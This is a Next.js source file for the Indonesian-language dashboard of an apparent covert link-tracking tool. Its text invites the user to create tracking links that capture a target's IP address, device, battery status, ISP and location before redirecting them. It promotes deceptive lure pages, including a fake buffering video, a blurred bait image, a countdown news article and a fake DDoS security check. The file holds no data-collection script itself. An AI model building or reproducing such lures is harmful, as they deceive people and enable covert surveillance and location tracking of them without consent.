import Link from "next/link";
import Navbar from "@/components/Navbar";
import { db } from "@/lib/db";
import {
  Radio,
  PlusCircle,
  ListFilter,
  Shield,
  Activity,
  Zap,
  MousePointerClick,
  Users,
  Battery,
  Server,
  Cpu,
  ArrowRight,
  Sparkles,
} from "lucide-react";
import StatCard from "@/components/stats/StatCard";

export const dynamic = "force-dynamic";

export default async function HomePage() {
  // Fetch overview statistics
  const totalLinks = await db.link.count();
  const totalClicks = await db.clickLog.count();
  const botClicks = await db.clickLog.count({ where: { isBot: true } });
  const humanClicks = totalClicks - botClicks;

  const recentLinks = await db.link.findMany({
    take: 5,
    orderBy: { createdAt: "desc" },
    include: {
      _count: { select: { clickLogs: true } },
    },
  });

  return (
    <div className="flex min-h-screen flex-col">
      <Navbar />

      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-10">
        {/* Hero Banner */}
        <div className="relative overflow-hidden rounded-3xl border border-cyan-500/20 bg-gradient-to-b from-[#101626] to-[#0a0e1a] p-8 sm:p-12 shadow-2xl">
          <div className="absolute top-0 right-0 -mt-8 -mr-8 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
          <div className="absolute bottom-0 left-0 -mb-8 -ml-8 w-80 h-80 bg-fuchsia-500/10 rounded-full blur-3xl pointer-events-none" />

          <div className="relative z-10 max-w-3xl space-y-4">
            <div className="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 text-xs font-mono font-medium">
              <Sparkles className="w-3.5 h-3.5 animate-spin" />
              <span>SISTEM INTELIJEN TELEMETRI LINK TINGKAT LANJUT</span>
            </div>

            <h1 className="text-3xl sm:text-5xl font-black tracking-tight text-white leading-tight">
              Lacak Target dengan{" "}
              <span className="bg-gradient-to-r from-cyan-400 via-teal-300 to-indigo-400 bg-clip-text text-transparent">
                Payload Kustom
              </span>{" "}
              & Data Akurat
            </h1>

            <p className="text-sm sm:text-base text-gray-300 leading-relaxed max-w-2xl">
              Tangkap alamat IP, tipe HP, status daya baterai, ISP, resolusi layar, dan lokasi geografis secara instan sebelum pengunjung dialihkan ke tujuan akhir.
            </p>

            <div className="flex flex-wrap items-center gap-3 pt-4">
              <Link
                href="/create"
                className="flex items-center space-x-2 px-6 py-3 rounded-xl bg-gradient-to-r from-cyan-500 to-indigo-600 text-black font-bold text-sm shadow-xl shadow-cyan-500/25 hover:from-cyan-400 hover:to-indigo-500 transition-all active:scale-95"
              >
                <PlusCircle className="w-4 h-4" />
                <span>Buat Link Pelacak Baru</span>
              </Link>

              <Link
                href="/links"
                className="flex items-center space-x-2 px-6 py-3 rounded-xl bg-white/5 border border-white/10 text-white font-semibold text-sm hover:bg-white/10 transition-all"
              >
                <ListFilter className="w-4 h-4 text-cyan-400" />
                <span>Lihat Semua Link ({totalLinks})</span>
              </Link>
            </div>
          </div>
        </div>

        {/* Global Statistics Counter */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <StatCard
            title="Total Tautan Dibuat"
            value={totalLinks}
            subtitle="Link aktif terpantau"
            icon={Activity}
            color="cyan"
          />
          <StatCard
            title="Total Klik Terekam"
            value={totalClicks}
            subtitle="Akumulasi sinyal telemetri"
            icon={MousePointerClick}
            color="emerald"
          />
          <StatCard
            title="Pengunjung Manusia"
            value={humanClicks}
            subtitle="Klik otentik terverifikasi"
            icon={Users}
            color="purple"
          />
          <StatCard
            title="Bot & Crawler Terfilter"
            value={botClicks}
            subtitle="WhatsApp / Google / Crawler"
            icon={Shield}
            color="rose"
          />
        </div>

        {/* Feature Cards / Payload Showcase */}
        <div className="space-y-4">
          <div className="flex items-center space-x-2 text-cyan-400">
            <Zap className="w-4 h-4" />
            <h2 className="text-sm font-bold font-mono uppercase tracking-wider text-gray-300">
              Payload & Pilihan Layar Umpan
            </h2>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="rounded-2xl border border-white/10 bg-[#101522]/80 p-5 backdrop-blur-xl space-y-3">
              <span className="text-xs font-mono font-bold text-cyan-400 bg-cyan-500/10 px-2.5 py-1 rounded-md border border-cyan-500/20">
                01. VIDEO BUFFER
              </span>
              <h3 className="text-base font-bold text-white">Video Loading Screen</h3>
              <p className="text-xs text-gray-400 leading-relaxed">
                Tampilan simulasi player streaming 4K HDR yang sedang buffering memberikan waktu bagi script membaca telemetri & baterai.
              </p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-[#101522]/80 p-5 backdrop-blur-xl space-y-3">
              <span className="text-xs font-mono font-bold text-purple-400 bg-purple-500/10 px-2.5 py-1 rounded-md border border-purple-500/20">
                02. FAKE IMAGE
              </span>
              <h3 className="text-base font-bold text-white">Image Preview Bait</h3>
              <p className="text-xs text-gray-400 leading-relaxed">
                Menampilkan pancingan foto dengan efek blur dan tombol &quot;Lihat Resolusi Penuh&quot; yang menggoda target untuk berinteraksi.
              </p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-[#101522]/80 p-5 backdrop-blur-xl space-y-3">
              <span className="text-xs font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-md border border-emerald-500/20">
                03. ARTICLE BAIT
              </span>
              <h3 className="text-base font-bold text-white">News & Viral Article</h3>
              <p className="text-xs text-gray-400 leading-relaxed">
                Cuplikan berita terkini dengan penghitung waktu mundur otomatis sebelum dialihkan ke portal sumber utama.
              </p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-[#101522]/80 p-5 backdrop-blur-xl space-y-3">
              <span className="text-xs font-mono font-bold text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-md border border-amber-500/20">
                04. DDOS CAPTCHA
              </span>
              <h3 className="text-base font-bold text-white">Security Verification</h3>
              <p className="text-xs text-gray-400 leading-relaxed">
                Simulasi pemeriksaan keamanan browser dan proteksi DDoS tingkat militer yang sangat meyakinkan bagi pengguna internet.
              </p>
            </div>
          </div>
        </div>

        {/* Recent Links Preview */}
        {recentLinks.length > 0 && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-lg font-bold text-white tracking-tight">
                Tautan Pelacak Terbaru
              </h2>
              <Link href="/links" className="text-xs font-mono text-cyan-400 hover:underline flex items-center space-x-1">
                <span>Lihat Semua</span>
                <ArrowRight className="w-3 h-3" />
              </Link>
            </div>

            <div className="rounded-2xl border border-white/10 bg-[#101522]/80 divide-y divide-white/5 overflow-hidden">
              {recentLinks.map((link) => (
                <div key={link.id} className="p-4 flex items-center justify-between hover:bg-white/[0.02] transition-colors">
                  <div className="space-y-1">
                    <h4 className="text-sm font-semibold text-white">{link.title}</h4>
                    <div className="flex items-center space-x-2 text-xs font-mono text-cyan-400">
                      <span>/{link.slug}</span>
                      <span className="text-gray-600">•</span>
                      <span className="text-gray-400">{link.payloadType}</span>
                    </div>
                  </div>

                  <div className="flex items-center space-x-4">
                    <span className="text-xs font-mono font-bold text-white bg-[#080c14] px-3 py-1.5 rounded-lg border border-cyan-500/20">
                      {link._count.clickLogs} Klik
                    </span>
                    <Link
                      href={`/stats/${link.id}`}
                      className="text-xs font-semibold text-cyan-400 hover:text-cyan-300 font-mono"
                    >
                      Buka Analitik →
                    </Link>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      <footer className="border-t border-white/5 py-6 text-center text-xs text-gray-500 font-mono">
        <p>ADVANCED LINK TRACKING ARCHITECTURE • TELEMETRY ENGINE & SENSOR RADAR</p>
      </footer>
    </div>
  );
}
